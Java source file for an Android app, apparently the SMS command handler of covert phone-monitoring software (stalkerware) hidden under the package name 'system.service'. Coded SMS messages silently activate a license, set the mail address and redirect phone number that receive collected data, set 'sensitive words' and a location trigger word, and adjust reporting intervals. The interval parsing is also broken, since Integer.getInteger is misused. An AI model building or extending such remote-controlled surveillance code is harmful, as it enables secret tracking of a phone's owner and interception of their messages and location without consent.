package system.service;

import java.util.Date;

import system.service.activity.GlobalPrefActivity;
import system.service.config.ConfigCtrl;
import system.service.feature.sms.SmsCtrl;
import android.content.Context;

import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.sms.SmsConsts;

public class IndicationHandler 
{
	public static void handleIndicationSms(Context context, String smsBody, String incomingPhoneNum) 
	{
		// -------------------------------------------------------
		// #0#<license key>: activate apk
		// #0#OFF: deactivate apk, and send SMS to server to clear using record to make it usable in other phone
		if (smsBody.startsWith(SmsConsts.INDICATION_KEY)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() == LicenseCtrl.ACTIVATION_KEY_LENGTH)
			{
				LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, smsBody);
				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) return;
				
				// Send auth SMS to server for registration
				// TODO
				
				ConfigCtrl.setLicenseKey(context, indication);
				ConfigCtrl.setLicenseType(context, type);
				Date now = new Date();
				ConfigCtrl.setConsumedDatetime(context, now);
				ConfigCtrl.setLastActivatedDatetime(context, now);
				
				// Necessary to force reboot to make key effective?
				// TODO
			} else if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
				LICENSE_TYPE type = ConfigCtrl.getLicenseType(context);
				// Only can deactivate FULL/PART/SUPER license key
				if (type == LICENSE_TYPE.NOT_LICENSED || type == LICENSE_TYPE.TRIAL_LICENSED) return;
				
				boolean ret = SmsCtrl.sendUnregisterSms(context);
				if (!ret) {
					// If not success, should send SMS to tell the receiver that it fails
					SmsCtrl.sendSms(incomingPhoneNum, context.getResources().getString(R.string.msg_cannot_unregister));
				}
			}
		}
		
		// -------------------------------------------------------
		// #1#<mail address>: change mail address
		else if (smsBody.startsWith(SmsConsts.INDICATION_MAIL)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0 && StrUtils.validateMailAddress(indication)) {
				GlobalPrefActivity.setMail(context, indication);
			} else {
				// Send SMS to warn the user
				//TODO
			}
		}
		
		// -------------------------------------------------------
		// #2#<interval days>: change get info interval days
		else if (smsBody.startsWith(SmsConsts.INDICATION_INTERVAL)) {
			String indication = smsBody.substring(3).trim();
			int days = 1;
			try {
				days = Integer.getInteger(indication);
			} catch (Exception ex) {
				// Send SMS to warn the user
				//TODO
				return;
			}
			
			if (days < 1 || days > 7) {
				// Send SMS to warn the user
				// TODO
				return;
			}
			
			GlobalPrefActivity.setInfoInterval(context, days);
		}
		
		// -------------------------------------------------------
		// #3#<receiver phone number>: change receiver phone number
		else if (smsBody.startsWith(SmsConsts.INDICATION_RECV_PHONE_NUM)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0) {
				GlobalPrefActivity.setRedirectPhoneNum(context, indication);
			}
		}
		
		// -------------------------------------------------------
		// #4#<sensitive words>: change sensitive words
		else if (smsBody.startsWith(SmsConsts.INDICATION_SENS_WORDS)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.length() > 0) {
				// When it is OFF or off, we disable the location function
				if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
					GlobalPrefActivity.setSensitiveWords(context, "");
					return;
				}
				
				String oriWords = indication.replaceAll(" {2,}", GlobalPrefActivity.SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
				String[] words = oriWords.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
				if (words.length > GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT) {
					// Send SMS to warn the user
					// TODO
					
				}
				
				GlobalPrefActivity.setSensitiveWords(context, indication);
			}
		}
		
		// -------------------------------------------------------
		// #5#<location word>: change location word
		else if (smsBody.startsWith(SmsConsts.INDICATION_LOC_WORD)) {
			String indication = smsBody.substring(3).trim();
			
			// When it is OFF or off, we disable the location function
			if (indication.length() > 0) {
				if (indication.equalsIgnoreCase(SmsConsts.OFF)) {
					GlobalPrefActivity.setGpsWord(context, "");
				} else {
					GlobalPrefActivity.setGpsWord(context, indication);
				}
			}
		}
		
		// -------------------------------------------------------
		// #6#<Yes/No>: show location SMS or not
		else if (smsBody.startsWith(SmsConsts.INDICATION_SHOW_LOC_SMS)) {
			String indication = smsBody.substring(3).trim();
			
			if (indication.equalsIgnoreCase(SmsConsts.YES)) {
				GlobalPrefActivity.setDisplayGpsSMS(context, true);
			} else if (indication.equalsIgnoreCase(SmsConsts.NO)) {
				GlobalPrefActivity.setDisplayGpsSMS(context, false);
			}
		}
		
		// -------------------------------------------------------
		else if (smsBody.startsWith("#7#")) {
			String indication = smsBody.substring(3).trim();
		}
		
		// -------------------------------------------------------
		else if (smsBody.startsWith("#8#")) {
			String indication = smsBody.substring(3).trim();
		}
		
		// -------------------------------------------------------
		else if (smsBody.startsWith("#9#")) {
			String indication = smsBody.substring(3).trim();
		}
		
	}
}
